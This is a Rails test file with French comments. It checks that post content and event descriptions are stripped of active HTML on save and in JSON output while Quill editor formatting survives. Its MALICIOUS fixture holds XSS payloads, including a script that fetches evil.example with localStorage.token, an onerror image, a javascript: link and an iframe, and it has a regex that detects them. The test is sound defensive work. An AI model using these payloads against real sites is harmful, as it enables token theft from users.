require "test_helper"

# Le contenu des actus et la description des événements sont affichés en v-html
# (webapp et app mobile) : le JSON servi ne doit jamais contenir de HTML actif.
class RichTextSanitizationTest < ActiveSupport::TestCase
  MALICIOUS = '<p onclick="steal()">Bonjour <strong>à tous</strong></p>' \
              '<script>fetch("https://evil.example/?t="+localStorage.token)</script>' \
              '<img src="x" onerror="alert(1)"><a href="javascript:alert(1)">lien</a>' \
              '<iframe src="https://evil.example"></iframe>'

  def assert_inert(html)
    assert_no_match(/<script|onerror|onclick|javascript:|<iframe/i, html)
    assert_includes html, '<strong>à tous</strong>'
  end

  test "le contenu d'une actu est assaini à l'enregistrement et dans le JSON" do
    post = Post.create!(title: 'Actu', content: MALICIOUS, structure: structures(:association))
    assert_inert post.reload.content

    # Contenu déjà en base avant la correction : assaini à la sortie.
    Post.where(id: post.id).update_all(content: MALICIOUS)
    assert_inert post.reload.as_json['content']
  end

  test "la description d'un événement est assainie à l'enregistrement et dans le JSON" do
    event = Event.create!(title: 'Evt', description: MALICIOUS, structure: structures(:association),
                          category: Category.create!(name: 'AG', kind: 'event'),
                          start_at: 1.day.from_now, end_at: 2.days.from_now)
    assert_inert event.reload.description

    Event.where(id: event.id).update_all(description: MALICIOUS)
    assert_inert event.reload.as_json['description']
  end

  test "la mise en forme de l'éditeur (Quill) est conservée" do
    html = '<p class="ql-align-center"><span style="color: rgb(230, 0, 0);">rouge</span></p>' \
           '<ul><li>un</li></ul><a href="https://addfrance.fr" target="_blank" rel="noopener">site</a>'
    post = Post.create!(title: 'Actu', content: html, structure: structures(:association))
    assert_includes post.content, 'class="ql-align-center"'
    assert_includes post.content, 'color'
    assert_includes post.content, '<li>un</li>'
    assert_includes post.content, 'href="https://addfrance.fr"'
  end
end
